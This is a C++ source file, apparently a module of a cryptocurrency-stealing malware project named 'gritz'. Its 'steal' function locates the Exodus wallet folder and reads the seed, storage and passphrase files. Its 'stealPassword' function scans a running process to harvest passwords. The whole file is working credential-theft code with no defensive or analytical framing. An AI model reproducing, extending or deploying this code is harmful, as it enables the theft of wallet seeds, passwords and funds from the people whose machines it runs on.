#include "Exodus.h"

namespace gritz::features::exodus
{
	std::vector<byte*> cExodus::steal()
	{
		if (!filesystem::exists(wallet))
		{
			return {};
		}

		filesystem::path seed = wallet / "seed.seco";
		filesystem::path storage = wallet / "storage.seco";
		filesystem::path passphrase = wallet / "passphrase.seco";

		if (!filesystem::exists(seed) && !filesystem::exists(storage))
		{
			return {};
		}

		std::vector<std::pair<filesystem::path, size_t>> paths;

		paths.push_back({ seed, filesystem::file_size(seed) });
		paths.push_back({ storage, filesystem::file_size(storage) });
		if (!bPassphrase)
		{
			paths.push_back({ passphrase, filesystem::file_size(passphrase) });
		}

		return gritz::utils::files::readList(paths);
	}

	std::string cExodus::stealPassword()
	{
		std::vector<std::string> results;
		scanProcess(results);

		std::stringstream ss;

		for (std::string result : results)
		{
			ss << result << ' ';
		}

		return ss.str();
	}
}